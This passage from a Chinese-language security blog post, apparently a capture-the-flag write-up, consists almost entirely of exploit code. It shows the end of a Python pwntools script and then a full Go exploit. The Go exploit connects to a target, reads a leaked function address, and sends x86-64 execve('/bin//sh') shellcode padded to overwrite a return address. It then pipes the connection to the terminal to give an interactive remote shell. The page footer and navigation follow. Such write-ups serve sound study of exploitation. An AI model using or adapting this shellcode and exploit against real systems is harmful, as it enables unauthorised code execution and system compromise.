class="string">b&quot;\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05&quot;</span></span><br><span class="line">payload = shellcode.ljust(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>) + p64(funcAddr_int)</span><br><span class="line">sh.recvuntil(<span class="string">b&quot;say?\n&quot;</span>)</span><br><span class="line">sh.sendline(payload)</span><br></pre></td></tr></table></figure>
+
+<p>exp2</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;bufio&quot;</span></span><br><span class="line">    <span class="string">&quot;encoding/binary&quot;</span></span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;io&quot;</span></span><br><span class="line">    <span class="string">&quot;net&quot;</span></span><br><span class="line">    <span class="string">&quot;os&quot;</span></span><br><span class="line">    <span class="string">&quot;strconv&quot;</span></span><br><span class="line">    <span class="string">&quot;strings&quot;</span></span><br><span class="line">    <span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    target := <span class="string">&quot;192.168.222.1:56459&quot;</span></span><br><span class="line">    conn, err := net.Dial(<span class="string">&quot;tcp&quot;</span>, target)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(err)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">defer</span> conn.Close()</span><br><span class="line">    fmt.Println(<span class="string">&quot;Successfully connect to&quot;</span>, target)</span><br><span class="line"></span><br><span class="line">    redtext(conn, <span class="string">&quot;&quot;</span>)</span><br><span class="line">	fmt.Println(<span class="string">&quot;==================&quot;</span>)</span><br><span class="line">    _, err = conn.Write([]<span class="type">byte</span>(<span class="string">&quot;130\n&quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;Write error:&quot;</span>, err)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    funcAddr := redtext(conn, <span class="string">&quot;0x&quot;</span>)</span><br><span class="line">	fmt.Println(<span class="string">&quot;Found funcAddr:&quot;</span>, funcAddr)</span><br><span class="line">	intfuncAddr, _ := strconv.ParseUint(funcAddr, <span class="number">0</span>, <span class="number">64</span>)</span><br><span class="line">    fmt.Println(<span class="string">&quot;funcAddr int:&quot;</span>, intfuncAddr)</span><br><span class="line"></span><br><span class="line">	<span class="comment">//shellcode</span></span><br><span class="line">	shellcode := []<span class="type">byte</span>&#123;</span><br><span class="line">        <span class="number">0x6a</span>, <span class="number">0x42</span>, <span class="number">0x58</span>, <span class="number">0xfe</span>, <span class="number">0xc4</span>, <span class="number">0x48</span>, <span class="number">0x99</span>, <span class="number">0x52</span>,</span><br><span class="line">        <span class="number">0x48</span>, <span class="number">0xbf</span>, <span class="number">0x2f</span>, <span class="number">0x62</span>, <span class="number">0x69</span>, <span class="number">0x6e</span>, <span class="number">0x2f</span>, <span class="number">0x2f</span>,</span><br><span class="line">        <span class="number">0x73</span>, <span class="number">0x68</span>, <span class="number">0x57</span>, <span class="number">0x54</span>, <span class="number">0x5e</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xd0</span>,</span><br><span class="line">        <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xd2</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>,</span><br><span class="line">    &#125;</span><br><span class="line">	padded := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">0x68</span>)</span><br><span class="line">	<span class="built_in">copy</span>(padded,shellcode)</span><br><span class="line">	<span class="keyword">for</span> i := <span class="built_in">len</span>(shellcode); i &lt; <span class="number">0x68</span>; i++ &#123;</span><br><span class="line">        padded[i] = <span class="string">&#x27;a&#x27;</span> <span class="comment">// 填充 &#x27;a&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">	retaddr :=<span class="built_in">make</span>([]<span class="type">byte</span>,<span class="number">8</span>)</span><br><span class="line">	binary.LittleEndian.PutUint64(retaddr, intfuncAddr)</span><br><span class="line">	payload := <span class="built_in">append</span>(padded, retaddr...)</span><br><span class="line">	conn.Write(payload)</span><br><span class="line">	conn.Write([]<span class="type">byte</span>(<span class="string">&quot;\n&quot;</span>))</span><br><span class="line">	fmt.Println(<span class="string">&quot;Payload write Success!&quot;</span>)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;==&gt;&quot;</span>)</span><br><span class="line">	<span class="keyword">go</span> io.Copy(conn,os.Stdin)</span><br><span class="line">	io.Copy(os.Stdout,conn)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// redtext 重写版：带超时读取</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">redtext</span><span class="params">(conn net.Conn, prefix <span class="type">string</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">    targetString := <span class="string">&quot;&quot;</span></span><br><span class="line">    reader := bufio.NewReader(conn)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置超时，防止阻塞</span></span><br><span class="line">    conn.SetReadDeadline(time.Now().Add(<span class="number">2</span> * time.Second))</span><br><span class="line">    <span class="keyword">defer</span> conn.SetReadDeadline(time.Time&#123;&#125;) <span class="comment">// 取消超时</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        line, err := reader.ReadString(<span class="string">&#x27;\n&#x27;</span>) <span class="comment">// 按行读取</span></span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">break</span> <span class="comment">// 超时或连接关闭</span></span><br><span class="line">        &#125;</span><br><span class="line">        line = strings.TrimRight(line, <span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">        fmt.Println(line)</span><br><span class="line">        <span class="keyword">if</span> prefix != <span class="string">&quot;&quot;</span> &amp;&amp; strings.HasPrefix(line, prefix) &#123;</span><br><span class="line">            targetString = line</span><br><span class="line">            <span class="keyword">break</span> <span class="comment">// 找到第一条符合的就返回</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> targetString</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+
+  
+    <nav class="post-toc" id="post-toc" aria-label="文章目录"></nav>
+  
+
+  
+    <footer class="post__license">
+      <span class="post__license-author">Yliken</span>
+      <span class="post__license-sep" aria-hidden="true">·</span>
+      <a class="post__license-link" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a>
+    </footer>
+  
+</article>
+
+
+
+
+  <nav class="post-nav" aria-label="相邻文章">
+    
+      <a class="post-nav__link post-nav__link--prev" href="/2025/09/09/CVE/%E5%85%B3%E4%BA%8E%20CVE-2025-53547%E7%9A%84%E6%80%9D%E8%80%83/">
+        <span class="post-nav__dir">← 上一篇</span>
+        <span class="post-nav__title">CVE-2025-53547：Helm依赖更新代码注入漏洞分析及深度思考</span>
+      </a>
+    
+    
+      <a class="post-nav__link post-nav__link--next" href="/2025/08/03/%E9%9D%B6%E6%9C%BA/mazesec/mazesec-Motto/">
+        <span class="post-nav__dir">下一篇 →</span>
+        <span class="post-nav__title">mazesec-Motto</span>
+      </a>
+    
+  </nav>
+
+
+    </div>
+  </main>
+
+  
+
+  
+  <footer class="site-footer">
+    <div class="container site-footer__inner">
+      
+      <p class="site-footer__copy">
+        © 2026 Yliken
+      </p>
+      
+        <p class="site-footer__motto">在技术里较真，也在生活里留白。</p>
+      
+      
+        <p class="site-footer__powered">Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> · <span class="site-footer__theme">Page One</span></p>
+      
+    </div>
+    
+  </footer>
+  
+<script src="/js/theme.js"></script>
+
+  
+  
+</body>
+</html>
